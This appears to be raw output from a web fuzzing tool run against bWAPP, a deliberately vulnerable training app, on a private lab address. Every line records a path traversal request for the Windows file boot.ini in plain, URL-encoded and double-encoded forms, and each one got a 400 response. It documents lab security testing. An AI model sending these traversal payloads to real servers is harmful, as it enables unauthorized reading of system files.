3,400,10L,42W,http://192.168.1.86/bWAPP/../../../boot.ini
2,400,10L,42W,http://192.168.1.86/bWAPP/../../boot.ini
4,400,10L,42W,http://192.168.1.86/bWAPP/../../../../boot.ini
5,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../boot.ini
6,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../boot.ini
7,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../boot.ini
8,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../boot.ini
22,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
23,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
24,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
18,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/boot.ini
19,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/boot.ini
20,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
21,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
209,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66boot.ini
211,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
212,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
208,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66boot.ini
210,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66boot.ini
213,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
